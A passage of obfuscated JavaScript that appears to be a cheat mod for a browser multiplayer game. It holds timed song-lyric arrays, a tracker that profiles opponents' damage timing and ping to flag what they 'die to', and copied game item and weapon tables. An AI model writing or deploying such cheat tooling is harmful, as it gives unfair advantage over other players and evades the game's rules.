      chats: [["Turi, ip ip ip", 5416], ["Ip ip ip turi ik", 8978], ["Ip, tsha ip ik", 12132], ["Eugh turi", 13782], ["eugh turi isha ip turisha", 15109], ["Turi, ip ip ip", 17597], ["Ip ip ip turi ik", 20042], ["Ip, tsha ip ik", 23025], ["Eugh turi", 24480], ["eugh turi isha ip turisha", 26215], ["Turi, ip ip ip", 29205], ["Ip ip ip turi ik", 31504], ["Ip, tsha ip ik", 34192], ["Eugh turi", 36291], ["eugh turi isha ip turisha", 37558], ["Turi, ip ip ip", 40202], ["Ip ip ip turi ik", 42762], ["Ip, tsha ip ik", 45921], ["Eugh turi", 47710], ["eugh turi isha ip turisha", 48742], ["Turi, ip ip ip", 56435], ["Ip ip ip turi ik", 58173], ["Ip, tsha ip ik", 59676], ["Eugh turi", 60421], ["eugh turi isha ip turisha", 60952], ["Turi, ip ip ip", 62832], ["Ip ip ip turi ik", 65534], ["Ip, tsha ip ik", 68072], ["Eugh turi", 69931], ["eugh turi isha ip turisha", 71160], ["Turi, ip ip ip", 74119], ["Ip ip ip turi ik", 76666], ["Ip, tsha ip ik", 79454], ["Eugh turi", 81186], ["eugh turi isha ip turisha", 82433], ["Turi, ip ip ip", 85346], ["Ip ip ip turi ik", 87963], ["Ip, tsha ip ik", 90757], ["Eugh turi", 92776], ["eugh turi isha ip turisha", 93914], ["Thsa", 98686], ["Ip ip", 100534], ["Thsa", 109780], ["Ip ip", 116890], ["Turi, ip ip ip", 119438], ["Ip ip ip turi ik", 121839], ["Ip, tsha ip ik", 124701], ["Eugh turi", 126186], ["eugh turi isha ip turisha", 127726], ["Turi, ip ip ip", 130610], ["Ip ip ip turi ik", 133162], ["Ip, tsha ip ik", 136083], ["Eugh turi", 138451], ["eugh turi isha ip turisha", 139431], ["Turi, ip ip ip", 141718], ["Ip ip ip turi ik", 171766], ["Ip, tsha ip ik", 173608], ["Eugh turi", 174050], ["eugh turi isha ip turisha", 174714], ["Turi, ip ip ip", 175754], ["Ip ip ip turi ik", 178427], ["Ip, tsha ip ik", 180996], ["Eugh turi", 182437], ["eugh turi isha ip turisha", 184070], ["Turi, ip ip ip", 186868], ["Ip ip ip turi ik", 189609], ["Ip, tsha ip ik", 192300], ["Eugh turi", 193692], ["eugh turi isha ip turisha", 195611], ["Turi, ip ip ip", 198298], ["Ip ip ip turi ik", 201268], ["Ip, tsha ip ik", 203682], ["Eugh turi", 205139], ["eugh turi isha ip turisha", 206782], ["Thsa", 211680], ["Ip ip", 219763], ["Thsa", 222759], ["Ip ip", 229811], ["Turi, ip ip ip", 232450], ["Ip ip ip turi ik", 234711], ["Ip, tsha ip ik", 237682], ["Eugh turi", 238925], ["eugh turi isha ip turisha", 240651], ["Turi, ip ip ip", 243450], ["Ip ip ip turi ik", 246046], ["Ip, tsha ip ik", 248938], ["Eugh turi", 250268], ["eugh turi isha ip turisha", 251933]]
    };
    this.livinglife = {
      audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/981928418729934898/1_ac_2_6_22.mp3"),
      chats: [["Lord knows and I think", 15780], ["I know it too sometimes", 17285], ["Every time and", 18961], ["they reachin' out for", 20223], ["what's mine", 21570], ["Lord knows and I think", 22570], ["I know it too sometimes", 23781], ["Every time and", 25775], ["they reachin' out for", 26932], ["what's mine", 28198], ["I've been awake for days", 28955], ["So we out living life", 29943], ["in the night", 31597], ["Pray to god", 32598], ["man I hope I don't die", 33597], ["I've been awake for days", 35267], ["So we out living life", 36571], ["in the night", 38253], ["Pray to god", 39199], ["man I hope I don't die", 40032], ["in the night", 41702], ["Lord knows and I think", 42527], ["I know it too sometimes", 43935], ["Every time and", 45937], ["they reachin' out for", 47036], ["what's mine", 48436], ["Lord knows and I think", 49263], ["I know it too sometimes", 50589], ["Every time and", 52486], ["they reachin' out for", 53708], ["what's mine", 55117], ["Two bedrooms", 56000], ["seven little child", 57218], ["can't be right", 58532], ["Call my brother", 59452], ["he in prison doin' time", 60420], ["but we alright", 61855], ["Tried my best just to", 62799], ["catch a fucking smile", 64059], ["But for now", 65327], ["I see myself ain't", 66109], ["hitting the 35", 67119], ["I've been awake for days", 69074], ["So we out living life", 70173], ["in the night", 71817], ["Pray to god", 72875], ["man I hope I don't die", 74031], ["I've been awake for days", 75399], ["So we out living life", 76931], ["in the night", 78639], ["Pray to god", 79393], ["man I hope I don't die", 80235], ["in the night", 81927], ["Lord knows and I think", 82788], ["I know it too sometimes", 84179], ["Every time and", 86217], ["they reachin' out for", 87354], ["what's mine", 88685], ["Lord knows and I think", 89588], ["I know it too sometimes", 90890], ["Every time and", 92840], ["they reachin' out", 93997], ["for what's mine", 95011]]
    };
    this.takeover = {
      audio: new Audio("https://cdn.discordapp.com/attachments/1174992357767262238/1176217713727770785/01._Take_Over.mp3"),
      chats: [["We at the top again, now what?", 16900], ["Heavy lay the crown, but", 18900], ["Count us", 20600], ["Higher than the mountain", 21380], ["And we be up here", 23300], ["for the long run", 24273], ["Strap in for a long one", 25413], ["We got everybody on one", 27400], ["Now you're coming at the king", 29740], ["so you better not miss", 30934], ["And we only get stronger", 33700], ["With everything I", 36163], ["carry up on my back", 37292], ["you should paint it", 39360], ["up with a target", 40771], ["Why would you dare me", 46000], ["to do it again?", 46960], ["Come get your spoiler", 50800], ["up ahead", 51977], ["We're taking over,", 53800], ["We're Taking Over", 56832], ["Look at you come at my name,", 61760], ["you 'oughta know by now,", 62866], ["That We're Taking Over,", 66300], ["We're Taking Over", 69411], ["Maybe you wonder what", 74500], ["your futures gonna be but", 76300], ["I got it all locked up", 77780], ["Take a lap, now", 93800], ["Don't be mad, now", 94933], ["Run it back, run it back", 97000], ["run it back, now", 98777], ["I got bodies lining up,", 100100], ["Think you're dreaming", 101400], ["of greatness", 102663], [""], [""], [""], [""], [""], [""], [""], [""], [""], [""], [""], [""]]
    };
    this.outtamind = {
      audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/981933473709309982/GENTRAMMEL_-_Out_Of_My_Mind__Lyrics_.mp3"),
      chats: [["Remember the night that we met", 12576], ["Back at the party", 13709], ["you sat on the bed", 14448], ["You said I’m talented", 15380], ["you said I’m next", 16065], ["My only talent", 16922], ["is making you stressed", 17695], ["I know that I’m not in my best", 18510], ["lately I’m feeling like less", 20254], ["I hope that I’ll see you again", 21815], ["if I don’t than", 23230], ["I’ll lay at the rest", 23823], ["It’s crazy how it goes", 24705], ["left me all alone", 26020], ["I’ve been trying to move on", 28056], ["all I find are holes", 29465], ["Searching for a pot of gold", 31159], ["don’t know if I’ll ever know", 32572], ["How she left", 34156], ["me with no damn place to go", 34881], ["I’m okay, I’ll be fine", 37685], ["I’m just out of my mind", 40619], ["long nights, with no sleep", 43802], ["thinking bout you and me", 46646], ["I’m okay, I’ll be fine", 49703], ["I’m just out of my mind", 52687], ["Long nights, with no sleep", 56105], ["thinking bout you and me", 59131], ["Spent five months", 61884], ["at your crib", 62780], ["and I ain’t pay no rent", 63749], ["We should’ve just been friends", 64595], ["Cause I know you never meant", 66714], ["all the things that", 67975], ["you said to me", 70217], ["Froze my heart in uncertainty", 70849], ["Go and hit the club in some", 74061], ["make sure that you drunk af", 75561], ["Find another man you love", 77207], ["imma show you what you lost", 78681], ["I'mma show you how it feels", 80210], ["to realize everything", 81740], ["you ever knew", 82722], ["And everything you ever", 83692], ["had in love is gone", 84701], ["I’m okay, I’ll be fine", 86645], ["I’m just out of my mind", 88575], ["long nights, with no sleep", 93073], ["thinking bout you and me", 95794], ["I’m okay, I’ll be fine", 98841], ["I’m just out of my mind", 102063], ["Long nights, with no sleep", 105218], ["thinking bout you and me", 107967], ["I guess it’s here for real", 110894], ["and If I had another chance", 112311], ["I don’t know if I’d take", 113554], ["that bet against you", 114744], ["with another man", 115679], ["And if I ever saw your face", 116870], ["than I would probably", 118157], ["take a glance", 119295], ["But I would never bat at night", 119966], ["because you hate me", 121188], ["that’s a fact", 122158], ["I think that this is an epiphany", 123173], ["I don’t think that", 124724], ["you really listening", 125704], ["One day you gonna", 126388], ["be missing me", 127116], ["I swear to God", 127850], ["that we’ll never be frenemies", 128440], ["Female dogs be tryna", 129331], ["to be friends with me", 130191], ["I think they stealing my energy", 130907], ["in my DMs and they tempting me", 131654], ["I know that you really", 133839], ["resenting me now", 134709], ["I’m okay, I’ll be fine", 135602], ["I’m just out of my mind", 139010], ["long nights, with no sleep", 142174], ["thinking bout you and me", 144896], ["I’m okay, I’ll be fine", 148125], ["I’m just out of my mind", 151030], ["Long nights, with no sleep", 154548], ["thinking bout you and me", 157313]]
    };
    this.nobody = {
      audio: new Audio("https://cdn.discordapp.com/attachments/911557181353111595/1002036095938207815/Zack_Merci_X_CRVN_-_Nobody_NCS_Release.mp3"),
      chats: [["Children used to run and play", 16047], ["Look at all the mess we made", 18834], ["Guess I'll never know", 21972], ["where it went wrong", 23116], ["Sometimes I feel like", 27962], ["\"oh, that's sad\"", 28732], ["Goes viral then people forget", 30767], ["In this crazy world", 33943], ["I don't belong", 35045], ["I see fire burning", 39164], ["but I close my eyes", 41249], ["(I'd rather deny that)", 43809], ["Everything is falling", 45250], ["out of place", 47215], ["I see trees ripped", 50541], ["from the ground", 52212], ["But nobody makes a sound", 54210], ["I see fire burning", 57003], ["but I'm fine", 59240], ["And I am nobody", 61475], ["And I am Nobody", 73778], ["The future feels so", 99856], ["unsure we deserve more", 100949], ["The burden that you left", 106005], ["is way too heavy for me", 107306], ["Do you ever feel like", 111727], ["the world would die out", 113251], ["My anxiety is of", 114946], ["the roof I cry out", 116239], ["We have gone too far", 117923], ["take me back right now", 118984], ["I see fire burning", 124198], ["but I close my eyes", 125314], ["(I'd rather deny that)", 127683], ["Everything is falling", 129231], ["out of place", 131229], ["I see trees ripped", 134546], ["from the ground", 136762], ["But nobody makes a sound", 138246], ["I see fire burning", 140946], ["but I'm fine", 142957], ["And I am nobody", 145167], ["And I am nobody", 170418]]
    };
    this.outerspace = {
      audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/981935267155951646/BEAUZ_-_Outerspace_Lyrics_feat._Dallas.mp3"),
      chats: [["Falling in quickly", 2267], ["Tell me you feel something too", 6056], ["Caught in the moment", 9720], ["I'm lost here without you", 12072], ["Tangled up in your web", 15565], ["Holding on to", 18885], ["every word you said", 20299], ["I'm ready I know", 22258], ["I'm hoping it shows", 23880], ["Would you say the same?", 25613], ["We're falling", 27374], ["from the outer space", 28129], ["We're moving like a", 29969], ["full pace supernova", 30695], ["We're making all the", 33892], ["headlines now", 35003], ["And I just wanna", 36829], ["seize the moment", 38230], ["'Cause we won't", 40572], ["ever slow it down", 41372], ["Kissin' in the rain", 42947], ["Taste just like champagne", 44601], ["Ballin' everyday", 46401], ["We're falling from outer space", 47649], ["Hopin' time won't change", 49656], ["Got love on my brain", 51442], ["Would you say the same", 53257], ["We're falling from outer space", 54647], ["We're falling from outer space", 60982], ["We're falling from outer space", 67811], ["We're falling from outer space", 74600], ["We're falling from outer space", 81321], ["Falling in quickly", 86325], ["Tell me you feel something too", 90323], ["Caught in the moment", 94055], ["I'm lost here without you", 96170], ["Tangled up in your web", 99442], ["Holding on to", 103220], ["every word you said", 104814], ["I'm ready I know", 106585], ["I'm hoping it shows", 108178], ["Would you say the same?", 110052], ["We're falling from the outer space", 111856], ["We're moving like a", 114382], ["full pace supernova", 115087], ["We're making all the", 118063], ["headlines now", 119323], ["And I just wanna", 121048], ["seize the moment", 122684], ["'Cause we won't", 125220], ["ever slow it down", 125899], ["Kissin' in the rain", 127459], ["Taste just like champagne", 129015], ["Ballin' everyday", 130840], ["We're falling from outer space", 131919], ["Hopin' time won't change", 134393], ["Got love on my brain", 135921], ["Would you say the same?", 137671], ["We're falling from outer space (go)", 138737], ["We're falling from outer space", 147417], ["We're falling from outer space", 153800], ["We're falling from outer space", 160563], ["We're falling from outer space", 167204]]
    };
    this.playing = false;
    this.doing = false;
    this.current = null;
    this.loadAudio = function (_0xc2251b) {
      _0xc2251b.audio.load();
    };
    let _0x9667b6 = this;
    Object.getOwnPropertyNames(this).filter(_0x30d671 => !["playing", "doing", "current", "loadAudio"].includes(_0x30d671)).forEach(_0x405a15 => {
      _0x9667b6.loadAudio(this[_0x405a15]);
    });
  }
}
;
var trackers = [];
var mode = _0x467b8c => _0x467b8c.reduce((_0x5c4fb8, _0x4eb26c, _0x40816e, _0x3234f9) => _0x3234f9.filter(_0x4d514b => _0x4d514b === _0x5c4fb8).length >= _0x3234f9.filter(_0x46f893 => _0x46f893 === _0x4eb26c).length ? _0x5c4fb8 : _0x4eb26c, null);
class healTracker {
  constructor(_0x5273ba, _0x598d1c) {
    this.id = _0x598d1c;
    this.oldhp = _0x5273ba;
    this.dmgPromises = [];
    this.list = [];
    this.diesTo = [];
    this.pings = [];
    this.ping = 0;
    this.text = "no information gathered";
  }
  isRealPing(_0x3c7c28) {
    return Math.abs(this.ping - _0x3c7c28) < 40;
  }
  calculate() {
    let _0x7b84d0 = [];
    let _0x4bd04f = [];
    let _0x340b63 = [];
    let _0x2d7593 = 0;
    let _0x15c864 = null;
    let _0x48e5ec = 0;
    let _0x3eec53 = false;
    for (let _0x3aaef6 = 0, _0x314a2d; _0x3aaef6 < this.list.length; _0x3aaef6++) {
      _0x314a2d = this.list[_0x3aaef6];
      if (_0x314a2d.dmg < 45 && _0x314a2d.dmg >= 40 && _0x314a2d.type == "slow" && this.isRealPing(_0x314a2d.gap - 1000 / 9) && !_0x7b84d0.includes("nobull")) {
        _0x7b84d0.push("nobull");
      } else if (_0x314a2d.dmg >= 45) {
        if (_0x15c864 - _0x314a2d.delay2 < 400) {
          if (_0x314a2d.type == "fast" && _0x314a2d.clown > _0x48e5ec) {
            _0x48e5ec = _0x314a2d.clown;
            _0x2d7593++;
          } else if (_0x314a2d.type == "slow" && _0x15c864 - _0x314a2d.delay2 < 260) {
            _0x3eec53 = true;
          } else if (_0x314a2d.type == "slow") {
            console.log(_0x314a2d.clown);
            _0x340b63.push(_0x314a2d.clown);
            _0x4bd04f.push(_0x2d7593);
            _0x2d7593 = 0;
          }
        }
        _0x15c864 = _0x314a2d.delay2;
      }
    }
    _0x4bd04f.push(_0x2d7593);
    if (_0x4bd04f.length > 0) {
      _0x7b84d0.push(["bullspam", Math.max(_0x4bd04f)]);
    }
    _0x7b84d0.push(["shamePerInsta", _0x3eec53 ? -2 : 1]);
    if (_0x340b63.length > 0) {
      let _0x1e502c = mode(_0x340b63);
      _0x7b84d0.push(["stopAntiAt", _0x1e502c]);
    }
    ;
    return _0x7b84d0;
  }
  updateElem(_0x3f8f8b, _0x31b5e2) {
    let _0x158c35 = _0x3f8f8b.findIndex(_0x52c545 => _0x52c545[0] == _0x31b5e2[0]);
    if (_0x158c35 === -1) {
      _0x3f8f8b.push(_0x31b5e2);
    } else {
      _0x3f8f8b[_0x158c35] = _0x31b5e2;
    }
    return _0x3f8f8b;
  }
  assign(_0x279ea3, _0x2086b4) {
    for (let _0x278c50 = 0; _0x278c50 < _0x2086b4.length; _0x278c50++) {
      _0x279ea3 = this.updateElem(_0x279ea3, _0x2086b4[_0x278c50]);
    }
    return _0x279ea3;
  }
  track(_0x1ff6ed) {
    this.list.push(_0x1ff6ed);
    if (_0x1ff6ed.type == "slow") {
      this.pings.push(_0x1ff6ed.gap - 1000 / 9);
      if (this.pings.length > 20) {
        this.pings.shift();
      }
      this.ping = Math.round(this.pings.reduce((_0x388a95, _0x2b8f31) => _0x388a95 + _0x2b8f31, 0) / this.pings.length);
    }
    ;
    if (this.list.length > 15) {
      this.list.shift();
    }
    ;
    let _0x4a2c09 = this.calculate();
    if (_0x4a2c09.length > 0) {
      this.diesTo = this.assign(this.diesTo, _0x4a2c09);
      try {
        this.text = "dies to " + this.diesTo.map(_0x1749be => _0x1749be.join(" ")).join(",");
      } catch (_0x864de9) {
        this.text = "";
      }
      ;
    }
    ;
  }
  add(_0x318631, _0x2ab588) {
    let _0x4c4122 = this.healthType(_0x318631, this.oldhp);
    let _0x168fe5 = this.oldhp - _0x318631;
    this.oldhp = _0x318631;
    if (_0x4c4122 === "damage") {
      let _0x285695 = this.dmgPromises.length;
      let _0x2dcf17 = null;
      let _0x81a259 = Date.now();
      let _0x56a321 = trackers[this.id];
      new Promise(function (_0x51b32b) {
        _0x56a321.dmgPromises.push(_0x51b32b);
        setTimeout(_0x51b32b, 1000, false);
      }).then(function (_0x4ef807) {
        _0x56a321.dmgPromises.splice(_0x285695, 1);
        if (!_0x4ef807) {
          return;
        }
        let _0x13d13f = Date.now() - _0x81a259;
        let _0x2da245 = {
          delay1: _0x81a259,
          delay2: Date.now(),
          gap: _0x13d13f,
          dmg: _0x168fe5,
          type: _0x13d13f < 1000 / 9 ? "fast" : "slow",
          clown: _0x2ab588
        };
        _0x56a321.track(_0x2da245);
      });
      trackers[this.id] = _0x56a321;
    } else if (this.dmgPromises.length) {
      this.dmgPromises.forEach(_0x40a0ae => _0x40a0ae(true));
      this.dmgPromises = [];
    }
  }
  healthType(_0x5fbd8f, _0x1c4f40) {
    if (_0x5fbd8f < _0x1c4f40) {
      return "damage";
    } else {
      return "heal";
    }
  }
  update(_0x425e4b, _0x5ce3c2) {
    this.add(_0x425e4b, _0x5ce3c2);
  }
}
class Items {
  constructor() {
    this.groups = [{
      id: 0,
      name: "food",
      layer: 0
    }, {
      id: 1,
      name: "walls",
      place: true,
      limit: 30,
      layer: 0
    }, {
      id: 2,
      name: "spikes",
      place: true,
      limit: 15,
      layer: 0
    }, {
      id: 3,
      name: "mill",
      place: true,
      limit: 7,
      layer: 1
    }, {
      id: 4,
      name: "mine",
      place: true,
      limit: 1,
      layer: 0
    }, {
      id: 5,
      name: "trap",
      place: true,
      limit: 6,
      layer: -1
    }, {
      id: 6,
      name: "booster",
      place: true,
      limit: 12,
      layer: -1
    }, {
      id: 7,
      name: "turret",
      place: true,
      limit: 2,
      layer: 1
    }, {
      id: 8,
      name: "watchtower",
      place: true,
      limit: 12,
      layer: 1
    }, {
      id: 9,
      name: "buff",
      place: true,
      limit: 4,
      layer: -1
    }, {
      id: 10,
      name: "spawn",
      place: true,
      limit: 1,
      layer: -1
    }, {
      id: 11,
      name: "sapling",
      place: true,
      limit: 2,
      layer: 0
    }, {
      id: 12,
      name: "blocker",
      place: true,
      limit: 3,
      layer: -1
    }, {
      id: 13,
      name: "teleporter",
      place: true,
      limit: 2,
      layer: -1
    }];
    this.projectiles = [{
      indx: 0,
      layer: 0,
      src: "arrow_1",
      dmg: 25,
      speed: 1.6,
      scale: 103,
      range: 1000
    }, {
      indx: 1,
      layer: 1,
      dmg: 25,
      scale: 20
    }, {
      indx: 0,
      layer: 0,
      src: "arrow_1",
      dmg: 35,
      speed: 2.5,
      scale: 103,
      range: 1200
    }, {
      indx: 0,
      layer: 0,
      src: "arrow_1",
      dmg: 30,
      speed: 2,
      scale: 103,
      range: 1200
    }, {
      indx: 1,
      layer: 1,
      dmg: 16,
      scale: 20
    }, {
      indx: 0,
      layer: 0,
      src: "bullet_1",
      dmg: 50,
      speed: 3.6,
      scale: 160,
      range: 1400
    }];
    this.weapons = [{
      id: 0,
      type: 0,
      name: "tool hammer",
      desc: "tool for gathering all resources",
      src: "hammer_1",
      length: 140,
      width: 140,
      xOff: -3,
      yOff: 18,
      dmg: 25,
      range: 65,
      gather: 1,
      speed: 300
    }, {
      id: 1,
      type: 0,
      age: 2,
      name: "hand axe",
      desc: "gathers resources at a higher rate",
      src: "axe_1",
      length: 140,
      width: 140,
      xOff: 3,
      yOff: 24,
      dmg: 30,
      spdMult: 1,
      range: 70,
      gather: 2,
      speed: 400
    }, {
      id: 2,
      type: 0,
      age: 8,
      pre: 1,
      name: "great axe",
      desc: "deal more damage and gather more resources",
      src: "great_axe_1",
      length: 140,
      width: 140,
      xOff: -8,
      yOff: 25,
      dmg: 35,
      spdMult: 1,
      range: 75,
      gather: 4,
      speed: 400
    }, {
      id: 3,
      type: 0,
      age: 2,
      name: "short sword",
      desc: "increased attack power but slower move speed",
      src: "sword_1",
      iPad: 1.3,
      length: 130,
      width: 210,
      xOff: -8,
      yOff: 46,
      dmg: 35,
      spdMult: 0.85,
      range: 110,
      gather: 1,
      speed: 300
    }, {
      id: 4,
      type: 0,
      age: 8,
      pre: 3,
      name: "katana",
      desc: "greater range and damage",
      src: "samurai_1",
      iPad: 1.3,
      length: 130,
      width: 210,
      xOff: -8,
      yOff: 59,
      dmg: 40,
      spdMult: 0.8,
      range: 118,
      gather: 1,
      speed: 300
    }, {
      id: 5,
      type: 0,
      age: 2,
      name: "polearm",
      desc: "long range melee weapon",
      src: "spear_1",
      iPad: 1.3,
      length: 130,
      width: 210,
      xOff: -8,
      yOff: 53,
      dmg: 45,
      knock: 0.2,
      spdMult: 0.82,
      range: 142,
      gather: 1,
      speed: 700
    }, {
      id: 6,
      type: 0,
      age: 2,
      name: "bat",
      desc: "fast long range melee weapon",
      src: "bat_1",
      iPad: 1.3,
      length: 110,
      width: 180,
      xOff: -8,
      yOff: 53,
      dmg: 20,
      knock: 0.7,
      range: 110,
      gather: 1,
      speed: 300
    }, {
      id: 7,
      type: 0,
      age: 2,
      name: "daggers",
      desc: "really fast short range weapon",
      src: "dagger_1",
      iPad: 0.8,
      length: 110,
      width: 110,
      xOff: 18,
      yOff: 0,
      dmg: 20,
      knock: 0.1,
      range: 65,
      gather: 1,
      hitSlow: 0.1,
      spdMult: 1.13,
      speed: 100
    }, {
      id: 8,
      type: 0,
      age: 2,
      name: "stick",
      desc: "great for gathering but very weak",
      src: "stick_1",
      length: 140,
      width: 140,
      xOff: 3,
      yOff: 24,
      dmg: 1,
      spdMult: 1,
      range: 70,
      gather: 7,
      speed: 400
    }, {
      id: 9,
      type: 1,
      age: 6,
      name: "hunting bow",
      desc: "bow used for ranged combat and hunting",
      src: "bow_1",
      req: ["wood", 4],
      length: 120,
      width: 120,
      xOff: -6,
      yOff: 0,
      Pdmg: 25,
      projectile: 0,
      spdMult: 0.75,
      speed: 600
    }, {
      id: 10,
      type: 1,
      age: 6,
      name: "great hammer",
      desc: "hammer used for destroying structures",
      src: "great_hammer_1",
      length: 140,
      width: 140,
      xOff: -9,
      yOff: 25,
      dmg: 10,
      Pdmg: 10,
      spdMult: 0.88,
      range: 75,
      sDmg: 7.5,
      gather: 1,
      speed: 400
    }, {
      id: 11,
      type: 1,
      age: 6,
      name: "wooden shield",
      desc: "blocks projectiles and reduces melee damage",
      src: "shield_1",
      length: 120,
      width: 120,
      shield: 0.2,
      xOff: 6,
      yOff: 0,
      Pdmg: 0,
      spdMult: 0.7
    }, {
      id: 12,
      type: 1,
      age: 8,
      pre: 9,
      name: "crossbow",
      desc: "deals more damage and has greater range",
      src: "crossbow_1",
      req: ["wood", 5],
      aboveHand: true,
      armS: 0.75,
      length: 120,
      width: 120,
      xOff: -4,
      yOff: 0,
      Pdmg: 35,
      projectile: 2,
      spdMult: 0.7,
      speed: 700
    }, {
      id: 13,
      type: 1,
      age: 9,
      pre: 12,
      name: "repeater crossbow",
      desc: "high firerate crossbow with reduced damage",
      src: "crossbow_2",
      req: ["wood", 10],
      aboveHand: true,
      armS: 0.75,
      length: 120,
      width: 120,
      xOff: -4,
      yOff: 0,
      Pdmg: 30,
      projectile: 3,
      spdMult: 0.7,
      speed: 230
    }, {
      id: 14,
      type: 1,
      age: 6,
      name: "mc grabby",
      desc: "steals resources from enemies",
      src: "grab_1",
      length: 130,
      width: 210,
      xOff: -8,
      yOff: 53,
      dmg: 0,
      Pdmg: 0,
      steal: 250,
      knock: 0.2,
      spdMult: 1.05,
      range: 125,
      gather: 0,
      speed: 700
    }, {
      id: 15,
      type: 1,
      age: 9,
      pre: 12,
      name: "musket",
      desc: "slow firerate but high damage and range",
      src: "musket_1",
      req: ["stone", 10],
      aboveHand: true,
      rec: 0.35,
      armS: 0.6,
      hndS: 0.3,
      hndD: 1.6,
      length: 205,
      width: 205,
      xOff: 25,
      yOff: 0,
      Pdmg: 50,
      projectile: 5,
      hideProjectile: true,
      spdMult: 0.6,
      speed: 1500
    }];
    this.list = [{
      group: this.groups[0],
      name: "apple",
      desc: "restores 20 health when consumed",
      req: ["food", 10],
      consume: function (_0x5a8555) {
        return _0x5a8555.changeHealth(20, _0x5a8555);
      },
      scale: 22,
      holdOffset: 15,
      healing: 20,
      itemID: 0,
      itemAID: 16
    }, {
      age: 3,
      group: this.groups[0],
      name: "cookie",
      desc: "restores 40 health when consumed",
      req: ["food", 15],
      consume: function (_0x1a8406) {
        return _0x1a8406.changeHealth(40, _0x1a8406);
      },
      scale: 27,
      holdOffset: 15,
      healing: 40,
      itemID: 1,
      itemAID: 17
    }, {
      age: 7,
      group: this.groups[0],
      name: "cheese",
      desc: "restores 30 health and another 50 over 5 seconds",
      req: ["food", 25],
      consume: function (_0x568815) {
        if (_0x568815.changeHealth(30, _0x568815) || _0x568815.health < 100) {
          _0x568815.dmgOverTime.dmg = -10;
          _0x568815.dmgOverTime.doer = _0x568815;
          _0x568815.dmgOverTime.time = 5;
          return true;
        }
        return false;
      },
      scale: 27,
      holdOffset: 15,
      healing: 30,
      itemID: 2,
      itemAID: 18
    }, {
      group: this.groups[1],
      name: "wood wall",
      desc: "provides protection for your village",
      req: ["wood", 10],
      projDmg: true,
      health: 380,
      scale: 50,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 3,
      itemAID: 19
    }, {
      age: 3,
      group: this.groups[1],
      name: "stone wall",
      desc: "provides improved protection for your village",
      req: ["stone", 25],
      health: 900,
      scale: 50,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 4,
      itemAID: 20
    }, {
      age: 7,
      group: this.groups[1],
      name: "castle wall",
      desc: "provides powerful protection for your village",
      req: ["stone", 35],
      health: 1500,
      scale: 52,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 5,
      itemAID: 21
    }, {
      group: this.groups[2],
      name: "spikes",
      desc: "damages enemies when they touch them",
      req: ["wood", 20, "stone", 5],
      health: 400,
      dmg: 20,
      scale: 49,
      spritePadding: -23,
      holdOffset: 8,
      placeOffset: -5,
      itemID: 6,
      itemAID: 22,
      shadow: {
        offsetX: 5,
        offsetY: 5,
        blur: 20,
        color: "rgba(0, 0, 0, 0.5)"
      }
    }, {
      age: 5,
      group: this.groups[2],
      name: "greater spikes",
      desc: "damages enemies when they touch them",
      req: ["wood", 30, "stone", 10],
      health: 500,
      dmg: 35,
      scale: 52,
      spritePadding: -23,
      holdOffset: 8,
      placeOffset: -5,
      itemID: 7,
      itemAID: 23
    }, {
      age: 9,
      group: this.groups[2],
      name: "poison spikes",
      desc: "poisons enemies when they touch them",
      req: ["wood", 35, "stone", 15],
      health: 600,
      dmg: 30,
      pDmg: 5,
      scale: 52,
      spritePadding: -23,
      holdOffset: 8,
      placeOffset: -5,
      itemID: 8,
      itemAID: 24
    }, {
      age: 9,
      group: this.groups[2],
      name: "spinning spikes",
      desc: "damages enemies when they touch them",
      req: ["wood", 30, "stone", 20],
      health: 500,
      dmg: 45,
      turnSpeed: 0.003,
      scale: 52,
      spritePadding: -23,
      holdOffset: 8,
      placeOffset: -5,
      itemID: 9,
      itemAID: 25
    }, {
      group: this.groups[3],
      name: "windmill",
      desc: "generates gold over time",
      req: ["wood", 50, "stone", 10],
      health: 400,
      pps: 1,
      turnSpeed: 0.0016,
      spritePadding: 25,
      iconLineMult: 12,
      scale: 45,
      holdOffset: 20,
      placeOffset: 5,
      itemID: 10,
      itemAID: 26
    }, {
      age: 5,
      group: this.groups[3],
      name: "faster windmill",
      desc: "generates more gold over time",
      req: ["wood", 60, "stone", 20],
      health: 500,
      pps: 1.5,
      turnSpeed: 0.0025,
      spritePadding: 25,
      iconLineMult: 12,
      scale: 47,
      holdOffset: 20,
      placeOffset: 5,
      itemID: 11,
      itemAID: 27
    }, {
      age: 8,
      group: this.groups[3],
      name: "power mill",
      desc: "generates more gold over time",
      req: ["wood", 100, "stone", 50],
      health: 800,
      pps: 2,
      turnSpeed: 0.005,
      spritePadding: 25,
      iconLineMult: 12,
      scale: 47,
      holdOffset: 20,
      placeOffset: 5,
      itemID: 12,
      itemAID: 28
    }, {
      age: 5,
      group: this.groups[4],
      type: 2,
      name: "mine",
      desc: "allows you to mine stone",
      req: ["wood", 20, "stone", 100],
      iconLineMult: 12,
      scale: 65,
      holdOffset: 20,
      placeOffset: 0,
      itemID: 13,
      itemAID: 29
    }, {
      age: 5,
      group: this.groups[11],
      type: 0,
      name: "sapling",
      desc: "allows you to farm wood",
      req: ["wood", 150],
      iconLineMult: 12,
      colDiv: 0.5,
      scale: 110,
      holdOffset: 50,
      placeOffset: -15,
      itemID: 14,
      itemAID: 30
    }, {
      age: 4,
      group: this.groups[5],
      name: "pit trap",
      desc: "pit that traps enemies if they walk over it",
      req: ["wood", 30, "stone", 30],
      trap: true,
      ignoreCollision: true,
      hideFromEnemy: true,
      health: 500,
      colDiv: 0.2,
      scale: 50,
      holdOffset: 20,
      placeOffset: -5,
      alpha: 0.6,
      itemID: 15,
      itemAID: 31
    }, {
      age: 4,
      group: this.groups[6],
      name: "boost pad",
      desc: "provides boost when stepped on",
      req: ["stone", 20, "wood", 5],
      ignoreCollision: true,
      boostSpeed: 1.5,
      health: 150,
      colDiv: 0.7,
      scale: 45,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 16,
      itemAID: 32
    }, {
      age: 7,
      group: this.groups[7],
      doUpdate: true,
      name: "turret",
      desc: "defensive structure that shoots at enemies",
      req: ["wood", 200, "stone", 150],
      health: 800,
      projectile: 1,
      shootRange: 700,
      shootRate: 2200,
      scale: 43,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 17,
      itemAID: 33
    }, {
      age: 7,
      group: this.groups[8],
      name: "platform",
      desc: "platform to shoot over walls and cross over water",
